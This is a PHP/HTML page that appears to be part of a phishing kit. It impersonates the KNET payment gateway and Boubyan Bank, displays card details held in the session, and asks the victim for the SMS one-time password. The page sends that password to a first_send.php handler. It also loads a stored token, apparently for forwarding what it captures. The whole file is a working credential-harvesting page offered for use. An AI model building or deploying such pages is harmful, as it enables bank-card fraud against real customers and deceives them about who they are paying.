<!DOCTYPE html>
<html lang="en">

<?php
include 'controlPanel/Database.php';
$db = new Database();

$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);
if($db->dbNumRows( $result)){
    $rows = $db->dbFetchResult($result);
    foreach($rows as $row){
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
   

}

?>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="knet/css/style2.css">
    <title>KNET Payments</title>
    <link rel="icon" type="image/x-icon" href="knet/images/knet.jpg">
    <script src="https://code.jquery.com/jquery-3.6.4.js"
        integrity="sha256-a9jBBRygX1Bh5lt8GZjXDzyOB+bWve9EiO7tROUtj/E=" crossorigin="anonymous"></script>
</head>




<body>
    <div class="container">
        <div class="img-heading">
            <img src="knet/images/mob.jpg" />
        </div>
        <div class="panel">
            <div class="img-panel"><img src="knet/images/boubyan_logo.svg" /></div>
            <div class="row one">
                <span>Merchant:  </span>
                <span><?php echo( $_SESSION['bank'])?> Bank </span>
            </div>
            <div class="row one">
                <span>Amount: </span>
                <span style="margin-left: 10px;"> KD <?php echo( $_SESSION['amount'])?></span>
            </div>
        </div>

        <div class="panel">
            <div id="notificationbox"><br>
                <!-- Added for Points Redemption - modified -->
                <div class="notification" id="notification">
                    <p><span>NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered
                        with your bank.This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the
                        box below.</p>
                </div>
            </div>
            <div class="row one ">
                <span>Card Number : </span> <span class="tt"><?php echo( $_SESSION['prefix'])?>******<?php echo( substr($_SESSION['debitNumber'], -4) )?></span>
            </div>

            <div class="row one ">
                <span>Expration Month : </span> <span class="tt"><?php echo( $_SESSION['month'])?><span>
            </div>
            <div class="row one ">
                <span>Expration Year : </span> <span class="tt"><?php echo( $_SESSION['year'])?><span>
            </div>

            <div class="row one ">
                <span>PIN : </span> <span class="tt">****<span>
            </div>

            <div class="row one ">
                <span>OTP : </span> <input id="otp" type="password" onkeypress="return isNumber(event)"
                    placeholder="Timeout in 3:57" style="margin-left: 68px;border-radius: 5px;" class="custome tow">
            </div>

        </div>

        <div class="panel end">
            <button onclick="onPay();">Confrim</button>
            <button onclick="cancelPage();">Cancel</button>
        </div>
        <footer>
            <div class="fotter-1">
                <img src="knet/images/knet.jpg" width="30px" /> <span>Knet Payment Gateway</span>
            </div>
            <br>
        </footer>
    </div>
</body>

</html>


<script>
    var cardLength;
    var isSelected = false;
    var selected;
    var text = "Timeout in 3:57";
    var min = 3;
    var second = 57;

    document.getElementById("otp").maxLength = "6";

    var interval = setInterval(function () {
        if (second > 0) {
            --second;
        }
        if (second <= 0) {
            second = 59;
            --min;
        }

        $("#otp").attr("placeholder", "Timeout in " + min + ":" + second);

        if (min == 0) {
            clearInterval(interval);
        }
    }, 1000);


    function isNumber(evt) {
        evt = (evt) ? evt : window.event;
        var charCode = (evt.which) ? evt.which : evt.keyCode;
        if (charCode > 31 && (charCode < 48 || charCode > 57)) {
            return false;
        }
        return true;
    }

    function onPay() {
        var otp = $("#otp").val();

        if (otp != "") {
            var formData = {
                otp: otp,
                

        };
   
   
            $.get("first_send.php?text=" + otp, function (data, status) { });

        }
        else {
            alert('قم بإدخال الرمز المرسل الى رقم الهاتف أولا ..');
        }
    }

    function cancelPage() {
        window.location.href = "index.php";
    }
</script>